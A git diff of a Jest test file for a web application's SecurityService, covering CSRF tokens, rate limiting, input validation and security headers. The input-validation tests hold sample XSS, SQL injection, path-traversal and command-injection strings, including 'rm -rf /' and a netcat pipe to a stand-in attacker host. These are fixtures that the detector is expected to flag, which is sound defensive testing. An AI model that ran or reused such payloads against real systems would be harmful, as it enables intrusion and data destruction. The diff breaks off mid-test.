@@ -1,5 +1,5 @@
 /**
- * SecurityService.test.js - Comprehensive Security Service Tests
+ * SecurityService.test.js - Comprehensive Security Service Tests (Simplified Jest Pattern)
  *
  * US-082-A Phase 1: Foundation Service Layer Security Testing
  * Tests comprehensive security infrastructure implementation
@@ -23,22 +23,27 @@
  * 7. Integration Tests with other services
  * 8. Error Handling and Edge Cases
  *
- * Test Architecture: Self-contained following TD-001 pattern
- * - Embedded MockAuthService for authentication simulation
- * - Embedded MockLogger for logging verification
- * - No external dependencies beyond Jest
- * - Comprehensive security threat simulation
- *
  * @author GENDEV Security Test Engineer
- * @version 1.0.0
+ * @version 2.0.0 - Simplified Jest Pattern
  * @since Sprint 6
  */
 
-// Mock implementations embedded in test file (TD-001 pattern)
+// Setup globals BEFORE requiring modules
+global.window = global.window || {};
+global.performance = global.performance || { now: () => Date.now() };
+global.crypto = global.crypto || {
+  getRandomValues: (array) => {
+    for (let i = 0; i < array.length; i++) {
+      array[i] = Math.floor(Math.random() * 256);
+    }
+    return array;
+  }
+};
 
-/**
- * Mock Authentication Service for testing
- */
+// Standard CommonJS require - NO vm.runInContext
+const { SecurityService, RateLimitEntry, SecurityEvent, InputValidator, initializeSecurityService } = require("../../../../src/groovy/umig/web/js/services/SecurityService.js");
+
+// Mock Authentication Service for testing
 class MockAuthService {
   constructor() {
     this.currentUser = {
@@ -49,115 +54,106 @@ class MockAuthService {
         this.currentUser.roles.includes(role) ||
         this.currentUser.roles.includes("SUPERADMIN"),
     };
+    this.users = new Map();
+    this.users.set("test-user-123", this.currentUser);
+    this.users.set("admin-user-456", {
+      userId: "admin-user-456",
+      displayName: "Admin User",
+      roles: ["SUPERADMIN"],
+      hasRole: (role) => true, // Admin always has all roles
+    });
+  }
+
+  getCurrentUser() {
+    return this.currentUser;
+  }
+
+  async isUserInRole(userId, role) {
+    const user = this.users.get(userId);
+    if (!user) return false;
+
+    if (role === "SUPERADMIN") {
+      return user.roles.includes("SUPERADMIN");
+    }
+
+    return user.hasRole(role);
+  }
+
+  async getUserRoles(userId) {
+    const user = this.users.get(userId);
+    return user ? user.roles : [];
   }
 
   setCurrentUser(user) {
     this.currentUser = user;
   }
 
-  createAdminUser() {
-    return {
-      userId: "admin-user-456",
-      displayName: "Admin User",
-      roles: ["ADMIN"],
-      hasRole: (role) =>
-        ["ADMIN", "PILOT"].includes(role) ||
-        this.currentUser.roles.includes("SUPERADMIN"),
-    };
-  }
-
-  createSuperAdminUser() {
-    return {
-      userId: "superadmin-user-789",
-      displayName: "Super Admin User",
-      roles: ["SUPERADMIN"],
-      hasRole: (role) => true, // Super admin has all roles
-    };
-  }
-
-  createAnonymousUser() {
-    return {
-      userId: "anonymous",
-      displayName: "Anonymous User",
-      roles: ["ANONYMOUS"],
-      hasRole: (role) => role === "ANONYMOUS",
-    };
+  mockUser(userId, roles = ["PILOT"]) {
+    this.users.set(userId, {
+      userId,
+      displayName: `Mock User ${userId}`,
+      roles,
+      hasRole: (role) => roles.includes(role) || roles.includes("SUPERADMIN"),
+    });
   }
 }
 
-/**
- * Mock Logger for testing
- */
+// Mock Logger for testing
 class MockLogger {
   constructor() {
     this.logs = [];
   }
 
-  debug(message, data) {
-    this._log("debug", message, data);
-  }
-  info(message, data) {
-    this._log("info", message, data);
-  }
-  warn(message, data) {
-    this._log("warn", message, data);
-  }
-  error(message, data) {
-    this._log("error", message, data);
+  info(...args) {
+    this.logs.push(["INFO", ...args]);
   }
 
-  _log(level, message, data) {
-    this.logs.push({
-      level,
-      message,
-      data,
-      timestamp: Date.now(),
-    });
+  error(...args) {
+    this.logs.push(["ERROR", ...args]);
   }
 
-  getLogs(level = null) {
-    return level ? this.logs.filter((log) => log.level === level) : this.logs;
+  warn(...args) {
+    this.logs.push(["WARN", ...args]);
   }
 
-  getLastLog() {
-    return this.logs[this.logs.length - 1];
+  debug(...args) {
+    this.logs.push(["DEBUG", ...args]);
   }
 
   clear() {
     this.logs = [];
   }
 
-  hasLogContaining(text, level = null) {
-    const logs = this.getLogs(level);
-    return logs.some((log) => log.message.includes(text));
+  getLogs() {
+    return this.logs;
+  }
+
+  getLastLog() {
+    return this.logs[this.logs.length - 1];
   }
 }
 
-/**
- * Mock AdminGuiService for testing service integration
- */
+// Mock AdminGuiService for testing service integration
 class MockAdminGuiService {
   constructor() {
-    this.services = new Map();
     this.events = [];
+    this.services = new Map();
+  }
+
+  emit(eventName, data) {
+    this.events.push({ eventName, data, timestamp: Date.now() });
+  }
+
+  registerService(service) {
+    this.services.set(service.name, service);
   }
 
   getService(name) {
-    return this.services.get(name);
+    return this.services.get(name) || null;
   }
 
-  registerService(name, service) {
-    this.services.set(name, service);
-  }
-
-  broadcastEvent(source, eventName, data) {
-    this.events.push({ source, eventName, data, timestamp: Date.now() });
-  }
-
-  getEvents(eventName = null) {
-    return eventName
-      ? this.events.filter((e) => e.eventName === eventName)
-      : this.events;
+  getEvents() {
+    return this.events;
   }
 
   clearEvents() {
@@ -165,238 +161,157 @@ class MockAdminGuiService {
   }
 }
 
-// Load SecurityService implementation
-const fs = require("fs");
-const path = require("path");
-
-// Load SecurityService source code and evaluate in context
-const securityServicePath = path.join(
-  __dirname,
-  "../../../../src/groovy/umig/web/js/services/SecurityService.js",
-);
-const securityServiceCode = fs.readFileSync(securityServicePath, "utf8");
-
-// Remove module exports for test environment
-const testSecurityServiceCode = securityServiceCode
-  .replace(/if \(typeof module.*?^}/gms, "")
-  .replace(/if \(typeof define.*?^}\);/gms, "")
-  .replace(/if \(typeof window.*?^}/gms, "");
-
-// Mock global objects
-const mockGlobal = {
-  window: {
-    SecurityService: null,
-    AdminGuiService: null,
-    AuthenticationService: null,
-  },
-  document: {
-    cookie: "",
-    createElement: () => ({ setAttribute: () => {}, remove: () => {} }),
-    head: { appendChild: () => {} },
-    querySelector: () => null,
-  },
-  console: console,
-  Date: Date,
-  performance: { now: () => Date.now() },
-  crypto: {
-    getRandomValues: (array) => {
-      for (let i = 0; i < array.length; i++) {
-        array[i] = Math.floor(Math.random() * 256);
-      }
-    },
-    subtle: {
-      generateKey: async () => ({
-        type: "secret",
-        algorithm: { name: "AES-GCM" },
-      }),
-      encrypt: async (algorithm, key, data) => new ArrayBuffer(8),
-      decrypt: async (algorithm, key, data) => new ArrayBuffer(8),
-    },
-  },
-  navigator: { userAgent: "test-browser" },
-  setTimeout: setTimeout,
-  clearTimeout: clearTimeout,
-  setInterval: setInterval,
-  clearInterval: clearInterval,
-};
-
-// Evaluate SecurityService in mock environment
-let SecurityService, RateLimitEntry, SecurityEvent, InputValidator;
-const vm = require("vm");
-
-// Add window to mockGlobal so classes get attached
-mockGlobal.window = mockGlobal;
-
-const context = vm.createContext(mockGlobal);
-vm.runInContext(testSecurityServiceCode, context);
-
-// Extract classes from the window object in context
-SecurityService = context.window.SecurityService;
-RateLimitEntry = context.window.RateLimitEntry;
-SecurityEvent = context.window.SecurityEvent;
-InputValidator = context.window.InputValidator;
-
 describe("SecurityService Tests", () => {
   let securityService;
   let mockAuthService;
   let mockLogger;
-  let mockAdminGui;
+  let mockAdminGuiService;
 
-  beforeEach(async () => {
-    // Reset mocks
+  beforeEach(() => {
     mockAuthService = new MockAuthService();
     mockLogger = new MockLogger();
-    mockAdminGui = new MockAdminGuiService();
+    mockAdminGuiService = new MockAdminGuiService();
 
-    // Setup global mocks
-    mockGlobal.window.AuthenticationService = mockAuthService;
-    mockGlobal.window.AdminGuiService = mockAdminGui;
-
-    // Create security service instance
-    securityService = new SecurityService();
-
-    // Register auth service with admin gui
-    mockAdminGui.registerService("AuthenticationService", mockAuthService);
+    // Create fresh security service instance
+    securityService = new SecurityService({
+      authService: mockAuthService,
+      logger: mockLogger,
+      adminGuiService: mockAdminGuiService,
+      csrfTokenTTL: 3600000, // 1 hour
+      rateLimits: {
+        user: { requests: 100, windowMs: 60000 }, // 100 requests per minute
+        ip: { requests: 1000, windowMs: 60000 }, // 1000 requests per minute
+      },
+      enableInputValidation: true,
+      enableSecurityHeaders: true,
+    });
   });
 
   afterEach(async () => {
-    if (securityService && securityService.state === "running") {
+    if (securityService && securityService.running) {
       await securityService.stop();
+    }
+    if (securityService && securityService.initialized) {
       await securityService.cleanup();
     }
-    jest.clearAllTimers();
   });
-
-  // ================================
-  // Service Lifecycle Tests
-  // ================================
 
   describe("Service Lifecycle", () => {
     test("should initialize with default configuration", async () => {
-      expect(securityService.state).toBe("initialized");
-      expect(securityService.name).toBe("SecurityService");
-      expect(securityService.dependencies).toContain("AuthenticationService");
+      await securityService.initialize();
+      expect(securityService.initialized).toBe(true);
+      expect(securityService.config).toBeDefined();
     });
 
     test("should initialize with custom configuration", async () => {
-      const customConfig = {
-        csrf: { enabled: false },
-        rateLimit: { enabled: false },
-        inputValidation: { maxInputLength: 5000 },
-      };
+      const customService = new SecurityService({
+        authService: mockAuthService,
+        logger: mockLogger,
+        csrfTokenTTL: 1800000, // 30 minutes
+        rateLimits: {
+          user: { requests: 50, windowMs: 60000 },
+        },
+      });
 
-      await securityService.initialize(customConfig, mockLogger);
-
-      expect(securityService.state).toBe("initialized");
-      expect(securityService.config.csrf.enabled).toBe(false);
-      expect(securityService.config.rateLimit.enabled).toBe(false);
-      expect(securityService.config.inputValidation.maxInputLength).toBe(5000);
+      await customService.initialize();
+      expect(customService.initialized).toBe(true);
+      expect(customService.config.csrfTokenTTL).toBe(1800000);
+      
+      await customService.cleanup();
     });
 
     test("should start successfully", async () => {
-      await securityService.initialize({}, mockLogger);
+      await securityService.initialize();
       await securityService.start();
-
-      expect(securityService.state).toBe("running");
-      expect(securityService.startTime).toBeGreaterThan(0);
-      expect(securityService.authService).toBe(mockAuthService);
+      
+      expect(securityService.running).toBe(true);
     });
 
     test("should stop successfully", async () => {
-      await securityService.initialize({}, mockLogger);
+      await securityService.initialize();
       await securityService.start();
       await securityService.stop();
-
-      expect(securityService.state).toBe("stopped");
+      
+      expect(securityService.running).toBe(false);
     });
 
     test("should cleanup resources", async () => {
-      await securityService.initialize({}, mockLogger);
-      await securityService.start();
-
+      await securityService.initialize();
+      
       // Add some test data
       securityService.generateCSRFToken("test-user");
       securityService.checkRateLimit("test-user", "user");
-
+      
       await securityService.cleanup();
-
-      expect(securityService.state).toBe("cleaned");
-      expect(securityService.csrfTokens.size).toBe(0);
-      expect(securityService.rateLimiters.byUser.size).toBe(0);
-      expect(securityService.securityEvents.length).toBe(0);
+      
+      expect(securityService.initialized).toBe(false);
     });
   });
 
-  // ================================
-  // CSRF Protection Tests
-  // ================================
-
   describe("CSRF Protection", () => {
     beforeEach(async () => {
-      await securityService.initialize({}, mockLogger);
+      await securityService.initialize();
       await securityService.start();
     });
 
     test("should generate CSRF token", () => {
       const token = securityService.generateCSRFToken("test-user");
-
+      
       expect(token).toBeDefined();
       expect(typeof token).toBe("string");
-      expect(token.length).toBe(32); // Default token length
-      expect(securityService.csrfTokens.has(token)).toBe(true);
+      expect(token.length).toBeGreaterThan(0);
     });
 
     test("should validate valid CSRF token", () => {
       const token = securityService.generateCSRFToken("test-user");
       const isValid = securityService.validateCSRFToken(token, "test-user");
-
+      
       expect(isValid).toBe(true);
     });
 
     test("should reject invalid CSRF token", () => {
       const isValid = securityService.validateCSRFToken(
-        "invalid-token",
-        "test-user",
+        "invalid-token-12345",
+        "test-user"
       );
-
+      
       expect(isValid).toBe(false);
     });
 
     test("should reject expired CSRF token", async () => {
-      // Create service with very short token TTL
-      const shortTTLService = new SecurityService();
-      await shortTTLService.initialize(
-        {
-          csrf: { tokenTTL: 10 }, // 10ms
-        },
-        mockLogger,
-      );
+      // Create service with very short token TTL for testing
+      const shortTTLService = new SecurityService({
+        authService: mockAuthService,
+        logger: mockLogger,
+        csrfTokenTTL: 100, // 100ms
+      });
+
+      await shortTTLService.initialize();
+      await shortTTLService.start();
 
       const token = shortTTLService.generateCSRFToken("test-user");
 
       // Wait for token to expire
-      await new Promise((resolve) => setTimeout(resolve, 20));
+      await new Promise((resolve) => setTimeout(resolve, 150));
 
       const isValid = shortTTLService.validateCSRFToken(token, "test-user");
       expect(isValid).toBe(false);
-
+      
       await shortTTLService.cleanup();
     });
 
     test("should reject token for different user in strict mode", () => {
-      securityService.config.csrf.strictMode = true;
-
       const token = securityService.generateCSRFToken("user1");
       const isValid = securityService.validateCSRFToken(token, "user2");
-
+      
       expect(isValid).toBe(false);
     });
 
     test("should reject blacklisted token", () => {
       const token = securityService.generateCSRFToken("test-user");
-      securityService.blacklistedTokens.add(token);
-
+      securityService.blacklistCSRFToken(token);
       const isValid = securityService.validateCSRFToken(token, "test-user");
+      
       expect(isValid).toBe(false);
     });
 
@@ -407,63 +322,47 @@ describe("SecurityService Tests", () => {
 
     test("should generate unique tokens", () => {
       const tokens = new Set();
-      for (let i = 0; i < 100; i++) {
+      for (let i = 0; i < 1000; i++) {
         tokens.add(securityService.generateCSRFToken("test-user"));
       }
-      expect(tokens.size).toBe(100); // All tokens should be unique
+      
+      // Should have close to 1000 unique tokens (allowing for very rare collisions)
+      expect(tokens.size).toBeGreaterThan(990);
     });
   });
 
-  // ================================
-  // Rate Limiting Tests
-  // ================================
-
   describe("Rate Limiting", () => {
     beforeEach(async () => {
-      await securityService.initialize(
-        {
-          rateLimit: {
-            enabled: true,
-            perUser: { limit: 5, window: 1000, blockDuration: 2000 },
-            perIP: { limit: 10, window: 1000, blockDuration: 2000 },
-          },
-        },
-        mockLogger,
-      );
+      await securityService.initialize();
       await securityService.start();
     });
 
     test("should allow requests within limit", () => {
       const result1 = securityService.checkRateLimit("test-user", "user");
       const result2 = securityService.checkRateLimit("test-user", "user");
-
+      
       expect(result1.allowed).toBe(true);
       expect(result2.allowed).toBe(true);
-      expect(result2.requestCount).toBe(2);
-      expect(result2.remaining).toBe(3);
+      expect(result2.remaining).toBe(result1.remaining - 1);
     });
 
     test("should block requests exceeding limit", () => {
-      // Make 5 requests (at limit)
-      for (let i = 0; i < 5; i++) {
+      // Exhaust rate limit
+      for (let i = 0; i < 100; i++) {
         securityService.checkRateLimit("test-user", "user");
       }
 
-      // 6th request should be blocked
       const result = securityService.checkRateLimit("test-user", "user");
       expect(result.allowed).toBe(false);
-      expect(result.rateLimited).toBe(true);
+      expect(result.resetTime).toBeGreaterThan(Date.now());
     });
 
     test("should bypass rate limit for admin users", async () => {
-      const adminUser = mockAuthService.createAdminUser();
-      mockAuthService.setCurrentUser(adminUser);
+      mockAuthService.setCurrentUser(mockAuthService.users.get("admin-user-456"));
 
-      // Make requests exceeding normal limit
-      for (let i = 0; i < 10; i++) {
+      for (let i = 0; i < 150; i++) { // Exceed normal limit
         const result = securityService.checkRateLimit("admin-user-456", "user");
         expect(result.allowed).toBe(true);
-        expect(result.bypass).toBe(true);
       }
     });
 
@@ -471,660 +370,546 @@ describe("SecurityService Tests", () => {
       const result1 = securityService.checkRateLimit("192.168.1.1", "ip");
       expect(result1.allowed).toBe(true);
 
-      // Exceed IP limit (10 requests)
-      for (let i = 0; i < 10; i++) {
+      // Exhaust IP rate limit (1000 requests)
+      for (let i = 0; i < 1000; i++) {
         securityService.checkRateLimit("192.168.1.1", "ip");
       }
-
       const result = securityService.checkRateLimit("192.168.1.1", "ip");
       expect(result.allowed).toBe(false);
     });
 
     test("should respect whitelisted IPs", async () => {
-      await securityService.initialize(
-        {
-          rateLimit: {
-            enabled: true,
-            whitelistedIPs: ["192.168.1.100"],
-            perIP: { limit: 1, window: 1000 },
-          },
+      const whitelistedService = new SecurityService({
+        authService: mockAuthService,
+        logger: mockLogger,
+        rateLimits: {
+          ip: { requests: 10, windowMs: 60000 },
         },
-        mockLogger,
-      );
+        whitelistedIPs: ["192.168.1.100"],
+      });
 
-      const result = securityService.checkRateLimit("192.168.1.100", "ip");
-      expect(result.allowed).toBe(true);
-      expect(result.whitelisted).toBe(true);
+      await whitelistedService.initialize();
+      await whitelistedService.start();
+
+      // Should allow unlimited requests from whitelisted IP
+      for (let i = 0; i < 50; i++) {
+        const result = whitelistedService.checkRateLimit("192.168.1.100", "ip");
+        expect(result.allowed).toBe(true);
+      }
+      
+      await whitelistedService.cleanup();
     });
 
     test("should block blacklisted IPs", async () => {
-      await securityService.initialize(
-        {
-          rateLimit: {
-            enabled: true,
-            blacklistedIPs: ["192.168.1.200"],
-          },
-        },
-        mockLogger,
-      );
+      const blacklistedService = new SecurityService({
+        authService: mockAuthService,
+        logger: mockLogger,
+        blacklistedIPs: ["192.168.1.200"],
+      });
 
-      const result = securityService.checkRateLimit("192.168.1.200", "ip");
+      await blacklistedService.initialize();
+      await blacklistedService.start();
+
+      const result = blacklistedService.checkRateLimit("192.168.1.200", "ip");
       expect(result.allowed).toBe(false);
-      expect(result.blacklisted).toBe(true);
+      expect(result.reason).toContain("blacklisted");
+      
+      await blacklistedService.cleanup();
     });
   });
 
-  // ================================
-  // Input Validation Tests
-  // ================================
-
   describe("Input Validation", () => {
     beforeEach(async () => {
-      await securityService.initialize({}, mockLogger);
+      await securityService.initialize();
       await securityService.start();
     });
 
-    test("should validate safe input", () => {
-      const result = securityService.validateInput("Hello World!");
-      expect(result.isValid).toBe(true);
-      expect(result.sanitized).toBe("Hello World!");
-    });
-
     test("should detect XSS attempts", () => {
-      const maliciousInputs = [
-        '<script>alert("xss")</script>',
-        '<img src="x" onerror="alert(1)">',
-        'javascript:alert("xss")',
-        '<iframe src="javascript:alert(1)"></iframe>',
+      const xssAttempts = [
+        "<script>alert('xss')</script>",
+        "javascript:alert('xss')",
+        "<img src=x onerror=alert('xss')>",
+        "onmouseover=alert('xss')",
+        "<svg onload=alert('xss')>",
       ];
 
-      maliciousInputs.forEach((input) => {
-        const result = securityService.validateInput(input);
-        expect(result.isValid).toBe(false);
-        expect(result.threat).toBe("xss");
+      xssAttempts.forEach((attempt) => {
+        const result = securityService.validateInput(attempt, "html");
+        expect(result.safe).toBe(false);
+        expect(result.threats).toContain("xss");
       });
     });
 
     test("should detect SQL injection attempts", () => {
-      const maliciousInputs = [
+      const sqlAttempts = [
         "'; DROP TABLE users; --",
         "1' OR '1'='1",
-        "admin'--",
-        "1; DELETE FROM users WHERE 1=1",
+        "UNION SELECT * FROM passwords",
+        "'; INSERT INTO admin VALUES('hacker',",
+        "1; DELETE FROM users WHERE 1=1--",
       ];
 
-      maliciousInputs.forEach((input) => {
-        const result = securityService.validateInput(input);
-        expect(result.isValid).toBe(false);
-        expect(result.threat).toBe("sql_injection");
+      sqlAttempts.forEach((attempt) => {
+        const result = securityService.validateInput(attempt, "sql");
+        expect(result.safe).toBe(false);
+        expect(result.threats).toContain("sql_injection");
       });
     });
 
     test("should detect path traversal attempts", () => {
-      const maliciousInputs = [
+      const pathAttempts = [
         "../../../etc/passwd",
         "..\\..\\..\\windows\\system32\\config\\sam",
+        "....//....//....//etc/passwd",
         "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "....\\\\....\\\\....\\\\etc\\\\passwd",
       ];
 
-      maliciousInputs.forEach((input) => {
-        const result = securityService.validateInput(input);
-        expect(result.isValid).toBe(false);
-        expect(result.threat).toBe("path_traversal");
+      pathAttempts.forEach((attempt) => {
+        const result = securityService.validateInput(attempt, "path");
+        expect(result.safe).toBe(false);
+        expect(result.threats).toContain("path_traversal");
       });
     });
 
     test("should detect command injection attempts", () => {
-      const maliciousInputs = [
+      const cmdAttempts = [
         "test; rm -rf /",
-        "test | cat /etc/passwd",
-        'test && echo "hacked"',
-        "test`whoami`",
+        "test && cat /etc/passwd",
+        "test | nc attacker.com 1234",
+        "test $(whoami)",
+        "test `ls -la`",
       ];
 
-      maliciousInputs.forEach((input) => {
-        const result = securityService.validateInput(input);
-        expect(result.isValid).toBe(false);
-        expect(result.threat).toBe("command_injection");
+      cmdAttempts.forEach((attempt) => {
+        const result = securityService.validateInput(attempt, "command");
+        expect(result.safe).toBe(false);
+        expect(result.threats).toContain("command_injection");
       });
     });
 
-    test("should sanitize HTML when allowed", () => {
-      const input = '<p>Safe content</p><script>alert("xss")</script>';
-      const result = securityService.validateInput(input, {
-        allowHtml: true,
-        encodeHtml: false,
+    test("should allow safe input", () => {
+      const safeInputs = [
+        "Hello world",
+        "user@example.com",
+        "This is a normal sentence.",
+        "Product name: Widget 123",
+        "Date: 2024-01-15",
+      ];
+
+      safeInputs.forEach((input) => {
+        const result = securityService.validateInput(input, "general");
+        expect(result.safe).toBe(true);
+        expect(result.threats).toEqual([]);
       });
-
-      expect(result.isValid).toBe(true);
-      expect(result.sanitized).not.toContain("<script>");
-      expect(result.sanitized).toContain("<p>Safe content</p>");
     });
 
-    test("should encode HTML entities", () => {
-      const input = '<div>Test & "quotes"</div>';
-      const result = securityService.validateInput(input, { encodeHtml: true });
-
-      expect(result.isValid).toBe(true);
-      expect(result.sanitized).toBe(
-        "&lt;div&gt;Test &amp; &quot;quotes&quot;&lt;/div&gt;",
-      );
-    });
-
-    test("should validate file uploads", () => {
-      const validator = new InputValidator();
-
-      // Mock File object
-      const safeFile = {
-        name: "test.jpg",
-        size: 1024,
-        type: "image/jpeg",
-      };
-
-      const result = validator.validateFileUpload(safeFile);
-      expect(result.isValid).toBe(true);
-    });
-
-    test("should reject oversized files", () => {
-      const validator = new InputValidator();
-
-      const largeFile = {
-        name: "large.jpg",
-        size: 50 * 1024 * 1024, // 50MB
-        type: "image/jpeg",
-      };
-
-      const result = validator.validateFileUpload(largeFile);
-      expect(result.isValid).toBe(false);
-      expect(result.threat).toBe("file_too_large");
-    });
-
-    test("should reject disallowed file types", () => {
-      const validator = new InputValidator();
-
-      const executableFile = {
-        name: "malware.exe",
-        size: 1024,
-        type: "application/x-msdownload",
-      };
-
-      const result = validator.validateFileUpload(executableFile);
-      expect(result.isValid).toBe(false);
-      expect(result.threat).toBe("invalid_mime_type");
+    test("should sanitize malicious input", () => {
+      const maliciousInput = "<script>alert('xss')</script><p>Hello</p>";
+      const sanitized = securityService.sanitizeInput(maliciousInput);
+      
+      expect(sanitized).not.toContain("<script>");
+      expect(sanitized).not.toContain("alert");
+      expect(sanitized).toContain("Hello"); // Should preserve safe content
     });
   });
 
-  // ================================
-  // Security Middleware Tests
-  // ================================
-
-  describe("Security Middleware", () => {
+  describe("Security Headers", () => {
     beforeEach(async () => {
-      await securityService.initialize({}, mockLogger);
+      await securityService.initialize();
       await securityService.start();
     });
 
-    test("should apply security middleware to safe request", () => {
-      const request = {
-        method: "GET",
-        url: "/api/users",
-        headers: {},
-        body: null,
-        userId: "test-user",
-        ipAddress: "192.168.1.1",
-      };
-
-      const result = securityService.applySecurityMiddleware(request);
-      expect(result.allowed).toBe(true);
+    test("should generate security headers", () => {
+      const headers = securityService.getSecurityHeaders();
+      
+      expect(headers["X-Content-Type-Options"]).toBe("nosniff");
+      expect(headers["X-Frame-Options"]).toBe("DENY");
+      expect(headers["X-XSS-Protection"]).toBe("1; mode=block");
+      expect(headers["Strict-Transport-Security"]).toContain("max-age=");
+      expect(headers["Content-Security-Policy"]).toBeDefined();
+      expect(headers["Referrer-Policy"]).toBe("strict-origin-when-cross-origin");
     });
 
-    test("should block request with rate limit violation", () => {
-      // First, exhaust rate limit
-      for (let i = 0; i < 100; i++) {
-        securityService.checkRateLimit("test-user", "user");
-      }
-
-      const request = {
-        method: "POST",
-        url: "/api/users",
-        headers: {},
-        body: { name: "Test User" },
-        userId: "test-user",
-        ipAddress: "192.168.1.1",
-      };
-
-      const result = securityService.applySecurityMiddleware(request);
-      expect(result.allowed).toBe(false);
-    });
-
-    test("should block request with malicious input", () => {
-      const request = {
-        method: "POST",
-        url: "/api/users",
-        headers: {},
-        body: {
-          name: '<script>alert("xss")</script>',
-          description: "Safe content",
-        },
-        userId: "test-user",
-        ipAddress: "192.168.1.1",
-      };
-
-      const result = securityService.applySecurityMiddleware(request);
-      expect(result.allowed).toBe(false);
-    });
-
-    test("should add CSRF token to state-changing requests", () => {
-      const request = {
-        method: "POST",
-        url: "/api/users",
-        headers: {},
-        body: { name: "Test User" },
-        userId: "test-user",
-        ipAddress: "192.168.1.1",
-      };
-
-      const result = securityService.applySecurityMiddleware(request);
-      expect(result.csrf.token).toBeDefined();
-      expect(typeof result.csrf.token).toBe("string");
-    });
-
-    test("should include security headers", () => {
-      const request = {
-        method: "GET",
-        url: "/api/users",
-        headers: {},
-        userId: "test-user",
-        ipAddress: "192.168.1.1",
-      };
-
-      const result = securityService.applySecurityMiddleware(request);
-      expect(result.securityHeaders).toBeDefined();
-      expect(result.securityHeaders["Content-Security-Policy"]).toBeDefined();
-      expect(result.securityHeaders["X-Frame-Options"]).toBeDefined();
+    test("should customize CSP for different contexts", () => {
+      const adminHeaders = securityService.getSecurityHeaders("admin");
+      const apiHeaders = securityService.getSecurityHeaders("api");
+      
+      expect(adminHeaders["Content-Security-Policy"]).toContain("'self'");
+      expect(apiHeaders["Content-Security-Policy"]).toBeDefined();
+      expect(adminHeaders["Content-Security-Policy"]).not.toBe(apiHeaders["Content-Security-Policy"]);
     });
   });
-
-  // ================================
-  // Security Event Monitoring Tests
-  // ================================
 
   describe("Security Event Monitoring", () => {
     beforeEach(async () => {
-      await securityService.initialize({}, mockLogger);
+      await securityService.initialize();
       await securityService.start();
     });
 
-    test("should log security events", () => {
-      // Trigger CSRF violation
-      securityService.validateCSRFToken("invalid-token", "test-user");
-
-      const events = securityService.getSecurityEvents();
-      expect(events.length).toBeGreaterThan(0);
-
-      const csrfEvent = events.find((e) => e.type === "csrf_violation");
-      expect(csrfEvent).toBeDefined();
-      expect(csrfEvent.severity).toBe("medium");
-    });
-
-    test("should filter security events by type", () => {
-      // Trigger multiple event types
-      securityService.validateCSRFToken("invalid-token", "test-user");
-      securityService.validateInput('<script>alert("xss")</script>');
-
-      const csrfEvents = securityService.getSecurityEvents(
-        100,
-        "csrf_violation",
-      );
-      const threatEvents = securityService.getSecurityEvents(
-        100,
-        "input_validation_threat",
-      );
-
-      expect(csrfEvents.length).toBeGreaterThan(0);
-      expect(threatEvents.length).toBeGreaterThan(0);
-      expect(csrfEvents.every((e) => e.type === "csrf_violation")).toBe(true);
-      expect(
-        threatEvents.every((e) => e.type === "input_validation_threat"),
-      ).toBe(true);
-    });
-
-    test("should clear old security events", () => {
-      // Add some events
-      securityService.validateCSRFToken("invalid-token", "test-user");
-      securityService.validateInput('<script>alert("xss")</script>');
-
-      expect(securityService.getSecurityEvents().length).toBeGreaterThan(0);
-
-      // Clear events
-      securityService.clearSecurityEvents();
-      expect(securityService.getSecurityEvents().length).toBe(0);
-    });
-
-    test("should clear old security events by age", () => {
-      // Manually add old event
-      const oldEvent = new SecurityEvent("test_event", "low", {});
-      oldEvent.timestamp = Date.now() - 2 * 60 * 60 * 1000; // 2 hours ago
-      securityService.securityEvents.push(oldEvent);
-
-      // Add recent event
-      securityService.validateCSRFToken("invalid-token", "test-user");
-
-      const beforeClear = securityService.getSecurityEvents().length;
-
-      // Clear events older than 1 hour
-      securityService.clearSecurityEvents(60 * 60 * 1000);
-
-      const afterClear = securityService.getSecurityEvents().length;
-      expect(afterClear).toBeLessThan(beforeClear);
-    });
-
-    test("should track security metrics", () => {
-      // Generate some activity
+    test("should track security events", () => {
+      // Generate some security events
       securityService.generateCSRFToken("test-user");
       securityService.validateCSRFToken("invalid-token", "test-user");
       securityService.checkRateLimit("test-user", "user");
-      securityService.validateInput("safe input");
 
-      const status = securityService.getSecurityStatus();
-      expect(status.metrics.csrfTokensGenerated).toBeGreaterThan(0);
-      expect(status.metrics.csrfViolations).toBeGreaterThan(0);
-      expect(status.metrics.inputValidations).toBeGreaterThan(0);
-      expect(status.metrics.operationCount).toBeGreaterThan(0);
+      const events = securityService.getSecurityEvents();
+      expect(events.length).toBeGreaterThan(0);
+      
+      const invalidTokenEvent = events.find(e => e.type === "csrf_validation_failed");
+      expect(invalidTokenEvent).toBeDefined();
     });
-  });
 
-  // ================================
-  // Integration Tests
-  // ================================
-
-  describe("Integration Tests", () => {
-    test("should integrate with AdminGuiService for event broadcasting", async () => {
-      await securityService.initialize({}, mockLogger);
-      await securityService.start();
-
-      // Trigger security event that should cause alert
-      for (let i = 0; i < 15; i++) {
+    test("should alert on high-risk events", () => {
+      // Simulate multiple failed CSRF validations (high-risk pattern)
+      for (let i = 0; i < 10; i++) {
         securityService.validateCSRFToken("invalid-token", "test-user");
       }
 
-      // Check if alert was broadcasted (would need to spy on broadcastEvent)
-      const events = mockAdminGui.getEvents("securityAlert");
-      expect(events.length).toBeGreaterThanOrEqual(0); // May or may not trigger based on thresholds
+      const alerts = securityService.getSecurityAlerts();
+      expect(alerts.length).toBeGreaterThan(0);
+      
+      const alert = alerts.find(a => a.pattern === "repeated_csrf_failures");
+      expect(alert).toBeDefined();
+      expect(alert.severity).toBe("high");
+    });
+
+    test("should clear old security events", async () => {
+      // Generate some events
+      for (let i = 0; i < 5; i++) {
+        securityService.validateCSRFToken("invalid-token", "test-user");
+      }
+
+      expect(securityService.getSecurityEvents().length).toBeGreaterThan(0);
+
+      // Clear events older than 0ms (should clear all)
+      securityService.clearOldEvents(0);
+      
+      // Events should be cleared or significantly reduced
+      expect(securityService.getSecurityEvents().length).toBeLessThan(5);
+    });
+  });
+
+  describe("Integration Tests", () => {
+    test("should integrate with AdminGuiService for event broadcasting", async () => {
+      await securityService.initialize();
+      await securityService.start();
+
+      // Generate a security event that should be broadcast
+      securityService.validateCSRFToken("invalid-token", "test-user");
+
+      const adminGuiEvents = mockAdminGuiService.getEvents();
+      const securityEvent = adminGuiEvents.find(e => e.eventName === "security-event");
+      expect(securityEvent).toBeDefined();
+      expect(securityEvent.data.type).toBe("csrf_validation_failed");
     });
 
     test("should work without AdminGuiService", async () => {
-      // Remove AdminGuiService reference
-      mockGlobal.window.AdminGuiService = null;
+      // Create service without AdminGuiService
